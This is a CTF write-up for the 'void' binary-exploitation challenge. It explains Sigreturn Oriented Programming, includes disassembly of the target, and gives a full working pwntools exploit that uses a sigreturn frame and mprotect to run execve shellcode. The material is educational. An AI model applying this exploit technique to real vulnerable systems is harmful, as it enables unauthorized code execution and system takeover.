# void 

Points: 272

This was one of the good challenges that I tried during the CTF. It was based on a technique called SROP (Sigreturn Oriented Programming). 

The purpose of this challenge was to defeat ASLR and so the binary as such consisted of only two functions - `main` and `_start` both written in simple assembly making use of syscalls. 

I'll take you through challenge and how I solved it! 

## Preliminary checks:
```
void: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=7fd635b160836aff1b92af6f203e3b1f160f54cc, not stripped
```
```
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
gef➤  
```
As we can see, it is a 64-bit statically linked binary and only NX is enabled! So we'll need to figure out a way to inject shellcode and execute, if at all we use that approach. We will see how that can be done soon enough!
For now let's analyze the binary further! 

## Analysis:


```
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  main
0x0000000000401020  _start
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401000 <+0>:	mov    rax,0x0
   0x0000000000401007 <+7>:	mov    rdi,0x0
   0x000000000040100e <+14>:	mov    rsi,rsp
   0x0000000000401011 <+17>:	mov    rdx,0x7d0
   0x0000000000401018 <+24>:	syscall 
   0x000000000040101a <+26>:	ret    
End of assembler dump.
gef➤  disas _start
Dump of assembler code for function _start:
   0x0000000000401020 <+0>:	xor    eax,eax
   0x0000000000401022 <+2>:	call   0x401000 <main>
   0x0000000000401027 <+7>:	mov    rax,0x3c
   0x000000000040102e <+14>:	mov    rdi,0x0
   0x0000000000401035 <+21>:	syscall 
   0x0000000000401037 <+23>:	ret    
End of assembler dump.
gef➤  
```
Above is the assmbly dump for the two functions `main` and `_start`. As we can see there are no other functions, and the binary is statically linked, with no procedure linkage table or got address available during run time. Due to this, it becomes a challenge to obtain a leak! 
Hoewever if we dive into the program, we can see that, the `main()` function reads input from user. However, there is no stack frame defined and rsi points to the top of the stack. So eventually whatever input we give, it will remain at the top of the stack and will get executed as the next instruction.

So how do we go about it? Before discussing that, let us understand what does SROP mean and how it works.

## SROP
SROP stands for Sigreturn Oriented Programming and unlike Return Oriented Programming (ROP), it requires only two gadgets: `syscall` and a way to set `rax` register to `0xf`. In this challenge, it was quite difficult to write 0xf to rax as there weren't suitable gadgets available. But we can make use of the read syscall in main() to read 0xf bytes of input. With this, rax will store the number of characters read, i.e 0xf. Then we call syscall on it. This process comprises of the sigreturn syscall. 

The sigreturn is used to return from the signal handler and to clean up the stack frame after a signal has been unblocked. And "cleaning up the stack frame" really means it's restoring important context data that has been saved on the stack temporarily. This data includes values of all registers and some things that are unrelevant for exploitation, which is also the reason why at least 300 bytes are required for it to work. Since we can read upto 2000 bytes of data, it won't be a problem.

For exploitation sake, we make use of `SigreturnFrame()` available in pwntools. We can in fact control all registers with this gadget. Before moving onto the exploit, I'd like to remind you that NX is enabled, and since there is no libc we canot ret2libc either. So to break this barrier, we can use the mprotect syscall, to give `rwx` permissions to a certain bss section, wherein we can read our shellcode to, and execute it. As there is no stack frame defined, we add a stack frame with `asm(add rsp, 100)`, place our shellcode into it, and execute it. (The shellcode used is an execve 64-bit) 

## Exploit:
```
from pwn import *
context.arch = 'amd64'
context.log_level = "debug"

#p = remote("tamuctf.com", 443, ssl=True, sni="void")
p = process('./void')
#gdb.attach(p, gdbscript='set disassembly-flavor intel\nb*main\nc\n')

main = 0x0000000000401000
ret = 0x40101a
syscall = 0x0000000000401018
start = 0x400020

frame = SigreturnFrame()
frame.rax = 10
frame.rdi = 0x00000000400000
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = 0x00000000400018# ptr to start
frame.rip = syscall# mprotect syscall

chain = p64(main)

print(str(frame))
pay = p64(main) + p64(syscall) + bytes(frame)
p.send(pay)
sleep(0.1)

p.send(p64(syscall).ljust(15, b'\x00'))
sleep(0.1)
p.send(p64(start) + asm('add rsp, 100') + asm(shellcraft.sh()))
sleep(0.1)

p.interactive()
```


